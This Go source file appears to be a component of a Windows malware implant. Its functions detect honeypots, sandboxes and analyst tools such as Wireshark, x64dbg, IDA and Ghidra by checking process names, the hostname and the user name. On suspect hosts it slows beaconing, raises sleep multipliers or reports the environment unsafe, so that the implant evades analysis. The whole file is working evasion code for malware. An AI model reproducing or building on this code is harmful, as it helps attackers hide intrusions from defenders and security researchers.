//go:build windows && amd64

package main

import (
	"os"
	"strings"
)

var (
	honeypotDetected   bool
	honeypotChecked    bool
	adaptiveMultiplier int
)

func checkHoneypotEnvironment() bool {
	ed := getEnvDetector()

	for _, p := range ed.edrProducts {
		lower := strings.ToLower(p)
		if strings.Contains(lower, "wireshark") || strings.Contains(lower, "tcpdump") ||
			strings.Contains(lower, "fiddler") || strings.Contains(lower, "procmon") ||
			strings.Contains(lower, "ollydbg") || strings.Contains(lower, "x64dbg") ||
			strings.Contains(lower, "ida") || strings.Contains(lower, "ghidra") ||
			strings.Contains(lower, "dnspy") || strings.Contains(lower, "dumpcap") {
			return true
		}
	}

	hostname, _ := os.Hostname()
	lower := strings.ToLower(hostname)
	indicators := []string{"honeypot", "canary", "decoy", "trap"}
	for _, ind := range indicators {
		if strings.Contains(lower, ind) {
			return true
		}
	}

	username := os.Getenv("USERNAME")
	lowerUser := strings.ToLower(username)
	suspiciousUsers := []string{"sandbox", "malware", "virus", "cuckoo"}
	for _, su := range suspiciousUsers {
		if lowerUser == su {
			return true
		}
	}

	return false
}

func isHoneypotEnvironment() bool {
	if !honeypotChecked {
		honeypotDetected = checkHoneypotEnvironment()
		honeypotChecked = true
	}
	return honeypotDetected
}

func getAdaptiveSleepMultiplier() int {
	if adaptiveMultiplier > 0 {
		return adaptiveMultiplier
	}
	if isHoneypotEnvironment() {
		adaptiveMultiplier = 10
		return adaptiveMultiplier
	}
	_, profile := detectEnvironment()
	if profile == nil {
		adaptiveMultiplier = 1
		return adaptiveMultiplier
	}
	switch profile.Class {
	case EnvSandbox:
		adaptiveMultiplier = 8
	case EnvServer:
		adaptiveMultiplier = 2
	case EnvHighValue:
		adaptiveMultiplier = 3
	default:
		adaptiveMultiplier = 1
	}
	return adaptiveMultiplier
}

func getRecommendedBeaconInterval() int {
	if isHoneypotEnvironment() {
		return 300
	}
	_, profile := detectEnvironment()
	if profile == nil {
		return 60
	}
	if profile.MinBeaconInterval > 0 {
		return profile.MinBeaconInterval
	}
	switch profile.Class {
	case EnvSandbox:
		return 300
	case EnvServer:
		return 45
	case EnvHighValue:
		return 30
	default:
		return 60
	}
}

func isEnvironmentSafe() bool {
	if isHoneypotEnvironment() {
		return false
	}
	_, profile := detectEnvironment()
	if profile != nil && profile.Class == EnvSandbox {
		return false
	}
	return true
}

func getEnvironmentSummary() string {
	label, profile := detectEnvironment()
	if profile == nil {
		return "unknown"
	}
	flags := []string{label}
	if isHoneypotEnvironment() {
		flags = append(flags, "HONEYPOT")
	}
	ed := getEnvDetector()
	if len(ed.edrProducts) > 0 {
		flags = append(flags, "edr:"+strings.Join(ed.edrProducts, ","))
	}
	return strings.Join(flags, " | ")
}

func getEnvironmentThreatScore() int {
	score := 0
	if isHoneypotEnvironment() {
		score += 80
	}
	_, profile := detectEnvironment()
	if profile == nil {
		return score
	}
	switch profile.Class {
	case EnvSandbox:
		score += 60
	case EnvHighValue:
		score += 20
	case EnvServer:
		score += 10
	}
	return score
}
